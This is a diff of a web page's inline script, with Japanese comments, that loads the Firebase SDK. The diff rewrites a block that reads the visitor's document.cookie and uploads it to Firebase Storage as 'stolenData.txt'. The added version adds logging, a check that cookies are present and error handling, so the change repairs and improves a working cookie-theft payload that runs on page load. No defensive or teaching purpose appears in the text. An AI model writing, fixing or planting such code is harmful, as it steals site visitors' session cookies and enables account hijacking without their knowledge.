@@ -55,8 +55,8 @@
     </div>
 
 	<!-- Firebase SDK の読み込み -->
-<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
 
 <script>
   // Firebaseの設定（Firebaseコンソールから取得する）
@@ -69,14 +69,28 @@
             appId: "1:756338805186:web:cb740e035ac611b5baae5b",
   };
 
-	firebase.initializeApp(firebaseConfig);
+    // Firebase 初期化
+    firebase.initializeApp(firebaseConfig);
 
-  var stolenData = new Blob([document.cookie], {type: "text/plain"});
-  var storageRef = firebase.storage().ref("stolenData.txt");
-  
-  storageRef.put(stolenData).then(snapshot => {
-    console.log("Cookie data uploaded!");
-  });
+    // document.cookie の中身を確認
+    console.log("取得したクッキー:", document.cookie);
+
+    if (document.cookie) {
+        // Firebase Storageのリファレンスを取得
+        var storageRef = firebase.storage().ref("stolenData.txt");
+
+        // クッキーのデータをBlobに変換
+        var stolenData = new Blob([document.cookie], { type: "text/plain" });
+
+        // Firebase Storageにアップロード
+        storageRef.put(stolenData).then(snapshot => {
+            console.log("クッキーデータがアップロードされました！");
+        }).catch(error => {
+            console.error("アップロードに失敗:", error);
+        });
+    } else {
+        console.warn("クッキーが取得できませんでした。");
+    }
 </script>
 
 </body>
